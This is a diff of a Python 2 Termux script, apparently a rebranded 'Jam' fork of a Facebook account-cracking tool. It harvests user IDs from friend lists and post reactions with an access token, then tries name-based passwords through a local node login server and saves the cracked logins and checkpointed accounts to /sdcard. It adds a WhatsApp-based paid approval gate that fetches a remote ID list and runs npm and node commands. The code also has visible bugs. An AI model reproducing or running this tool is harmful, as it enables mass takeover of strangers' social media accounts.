@@ -1,14 +1,14 @@
 #coding=utf-8
 #!/usr/bin/python2
 #coding=utf-8
-#originally written by muhammad hamza
+#originally written by Jam Shahrukh
 try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
     from multiprocessing.pool import ThreadPool
 except ImportError:
     os.system("pip2 install requests")
     os.system("pkg install nodejs")
-    os.system("python2 hop.py")
+    os.system("python2 jam.py")
 try:
     os.mkdir('/sdcard/ids')
 except OSError:
@@ -27,20 +27,100 @@ sys.setdefaultencoding("utf8")
  
 logo = """
 
-  \033[1;31m  ██   ██      ██████      ██████ 
-    ██   ██     ██    ██     ██   ██ 
-    ███████     ██    ██     ██████  
-\033[0;97m    ██   ██     ██    ██     ██     
-    ██   ██      ██████      ██ 
+   \033[1;91m     ██ ███████ ███    ███ 
+        ██ ██   ██ ████  ████ 
+        ██ ███████ ██ ████ ██ 
+   \033[1;97m██   ██ ██   ██ ██  ██  ██ 
+   ███████ ██   ██ ██      ██
                
 ------------------------------------------
-
- ➣ Author : Muhammad Hamza
- ➣ Github : https://github.com/***   
- ➣ Youtube: HOP Programmers
- ➣ You cannot decompile it bro :)
- 
+ ➣ Author  : Jam x Xtylo x Asad
+ ➣ Github  : https://github.com/Jam   
+ ➣ Facebook: Jam Shahrukh Official
+ ➣ dont try to decompile it bro :)
 ------------------------------------------"""
+
+def reg():
+    os.system('clear')
+    print(logo)
+    print '\033[1;31;1mTake The Free Approval For Login'
+    time.sleep(1)
+    
+    try:
+        to = open('/sdcard/.jam_king.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
+
+    r = requests.get('https://raw.githubusercontent.com/cyber-jam/king/main/ip.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print(logo)
+        print '\tApproved Failed'
+        print ' \033[1;92mYour Id Is Not Approved Already '
+        print ' \033[1;92mCopy the id and send to admin'
+        print ' \033[1;92mYour id: ' + to
+        raw_input('\033[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923053176060')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print(logo)
+    print '\tApproval not detected'
+    print ' \033[1;92mCopy id press enter select whatsapp'
+    print("")
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    raw_input(' Press enter to go to whatsapp ')
+    os.system('xdg-open https://wa.me/+923053176060')
+    sav = open('/sdcard/.hst.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\033[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print(logo)
+    print("")
+    print '\tCollecting device info'
+    print("")
+    
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\033[1;92m Your ip: ' + ips
+    time.sleep(2)
+    print("")
+    print '\033[1;92m Your country: ' + country
+    time.sleep(2)
+    print("")
+    print '\033[1;92m Your region: ' + regi
+    time.sleep(2)
+    print("")
+    print ' \033[1;92mYour network: ' + network
+    time.sleep(1)
+    print("")
+    print ' Loading ...'
+    time.sleep(1)
+    login_choice()
+
 idh = []
 back = 0
 def login_choice():
@@ -154,7 +234,8 @@ def menu():
 	print("")
 	print("[1] Crack with auto pass")
 	print("[2] Crack with choice password")
-	print("[3] Extract ids")
+	print("[3] Create File")
+	print("[4] Extract Post Likes")
 	print("")
 	menu_option()
 def menu_option():
@@ -166,7 +247,7 @@ def menu_option():
 	elif select =="3":
 		ex_id()
 	elif select =="4":
-	    ex_file()
+	        ex_post()
 	else:
 		print("")
 		print("\t    \033[1;31mSelect valid option\033[0;97m")
@@ -275,19 +356,19 @@ def crack_select():
 		user=arg
 		uid,name=user.split("|")
 		try:
-			pass1 = "Pakistan"
+			pass1 = name+"12"
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass1+"\033[0;97m")
-				ok = open("/sdcard/ids/checkpoint.txt", "a")
+				print("\033[1;92m[Jam-Ok] "+uid+" | "+pass1)
+				ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("[Checkpoint] "+uid+" | "+pass1)
-					cp = open("checkpoint.txt","a")
+					print("\033[1;90m[Jam-Cp] "+uid+" | "+pass1)
+					cp = open("/sdcard/ids/jam_cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -296,15 +377,15 @@ def crack_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass2+"\033[0;97m")
-						ok = open("/sdcard/ids/checkpoint.txt", "a")
+						print("\033[1;92m[Jam-Ok] "+uid+" | "+pass2)
+						ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("[Checkpoint] "+uid+" | "+pass2)
-							cp = open("checkpoint.txt","a")
+							print("\033[1;90m[Jam-Cp] "+uid+" | "+pass2)
+							cp = open("/sdcard/ids/jam_cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -313,15 +394,15 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass3+"\033[0;97m")
-								ok = open("/sdcard/ids/checkpoint.txt", "a")
+								print("\033[1;92m[Jam-Ok] "+uid+" | "+pass3)
+								ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("[Checkpoint] "+uid+" | "+pass3)
-									cp = open("checkpoint.txt","a")
+									print("\033[1;90m[Jam-Cp] "+uid+" | "+pass3)
+									cp = open("/sdcard/ids/jam_cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -330,15 +411,15 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass4+"\033[0;97m")
-										ok = open("/sdcard/ids/checkpoint.txt", "a")
+										print("\033[1;92m[Jam-Ok] "+uid+" | "+pass4)
+										ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("[Checkpoint] "+uid+" | "+pass4)
-											cp = open("checkpoint.txt","a")
+											print("\033[1;90m[Jam-Cp] "+uid+" | "+pass4)
+											cp = open("/sdcard/ids/jam_cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.apppend(uid+pass4)
@@ -347,52 +428,35 @@ def crack_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass5+"\033[0;97m")
-												ok = open("/sdcard/ids/checkpoint.txt", "a")
+												print("\033[1;92m[Jam-Ok] "+uid+" | "+pass5)
+												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("[Checkpoint] "+uid+" | "+pass5)
-													cp = open("checkpoint.txt","a")
+													print("\033[1;90m[Jam-Cp] "+uid+" | "+pass5)
+													cp = open("/sdcard/ids/jam_cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
-													cps.append(uid+pass6)
+													cps.append(uid+pass5)
 												else:
-													pass6 = "000786"
+													pass6 = name+"1122"
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass6+"\033[0;97m")
-														ok = open("/sdcard/ids/checkpoint.txt", "a")
+														print("\033[1;92m[Jam-Ok] "+uid+" | "+pass6)
+														ok = open("/sdcard/ids/jam_ok.txt", "a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("[Checkpoint] "+uid+" | "+pass6)
-															cp = open("checkpoint.txt","a")
+															print("\033[1;90m[Jam-Cp] "+uid+" | "+pass6)
+															cp = open("/sdcard/ids/jam_cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
-														else:
-															pass7 = "786786"
-															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
-															q = json.loads(data)
-															if "loc" in q:
-																print("\033[1;37m[Checkpoint] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
-																ok = open("/sdcard/ids/checkpoint.txt", "a")
-																ok.write(uid+" | "+pass7+"\n")
-																ok.close()
-																oks.append(uid+pass7)
-															else:
-																if "www.facebook.com" in q["error"]:
-																	print("[Checkpoint] "+uid+" | "+pass7)
-																	cp = open("checkpoint.txt","a")
-																	cp.write(uid+" | "+pass7+"\n")
-																	cp.close()
-																	cps.append(uid+pass7)
 																
 		except:
 			pass
@@ -437,7 +501,7 @@ def ex_id():
         crack()
     r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
     q = json.loads(r.text)
-    ids = open("ids_friends.txt","w")
+    ids = open("ids_file.txt","w")
     for i in q["data"]:
         uid = i["id"]
         na = i["name"]
@@ -454,8 +518,59 @@ def ex_id():
     print(47*"-")
     print("")
     raw_input(" Press enter to download file")
-    os.system("cp ids_friends.txt /sdcard")
-    os.system("rm -rf ids_friends.txt")
+    os.system("cp ids_file.txt /sdcard")
+    os.system("rm -rf ids_file.txt")
+    print(" File downloaded successfully")
+    time.sleep(1)
+    menu()
+def ex_post():
+    idg=[]
+    global token
+    try:
+    	token = open(".login.txt","r").read()
+    except IOError:
+    	print("\t    \033[1;31mToken not found\033[0;97m")
+    	print("")
+    	time.sleep(1)
+    	login_choice()
+    os.system("clear")
+    print(logo)
+    una = ('100052292505058')
+    print("")
+    print("\t    \033[1;32mCOLLECT POST LIKES LINKS\033[0;97m")
+    print("")
+    una = raw_input(" Input Post Id: ")
+    try:
+        r = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+token, headers=header)
+        q = json.loads(r.text)
+	print(47*"-")
+    except KeyError:
+    	print("")
+        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+        print("")
+        raw_input(" Press enter to back")
+        crack()
+    r = requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+token, headers=header)
+    q = json.loads(r.text)
+    ids = open("likes_post.txt","w")
+    for i in q["data"]:
+        uid = i["id"]
+        na = i["name"]
+        nm=na.rsplit(" ")[0]
+        idg.append(uid+"|"+nm)
+        ids.write(uid+"|"+nm + "\n")
+    ids.close()
+    print("")
+    print(47*"-")
+    print("")
+    print(" The process has completed")
+    print(" Total ids: "+str(len(idg)))
+    print("")
+    print(47*"-")
+    print("")
+    raw_input(" Press enter to download file")
+    os.system("cp likes_post.txt /sdcard")
+    os.system("rm -rf likes_post.txt")
     print(" File downloaded successfully")
     time.sleep(1)
     menu()
@@ -577,14 +692,14 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;92m[Jam-Ok] "+uid+" | "+pass1)
 				ok = open("/sdcard/ids/checkpoint.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("[Checkpoint] "+uid+" | "+pass1)
+					print("\033[1;90m[Jam-Cp] "+uid+" | "+pass1)
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -593,14 +708,14 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;92m[Jam-Ok] "+uid+" | "+pass2)
 						ok = open("/sdcard/ids/checkpoint.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("[Checkpoint] "+uid+" | "+pass2)
+							print("\033[1;90m[Jam-Cp] "+uid+" | "+pass2)
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -609,14 +724,14 @@ def choice_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;92m[Jam-Ok] "+uid+" | "+pass3)
 								ok = open("/sdcard/ids/checkpoint.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("[Checkpoint] "+uid+" | "+pass3)
+									print("\033[1;90m[Jam-Cp] "+uid+" | "+pass3)
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -625,14 +740,14 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;92m[Jam-Ok] "+uid+" | "+pass4)
 										ok = open("/sdcard/ids/checkpoint.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("[Checkpoint] "+uid+" | "+pass4)
+											print("\033[1;90m[Jam-Cp] "+uid+" | "+pass4)
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -655,5 +770,5 @@ def choice_select():
 	raw_input(" Press enter to back")
 	choice()
 if __name__ == '__main__':
-	login_choice()
+	reg()
 
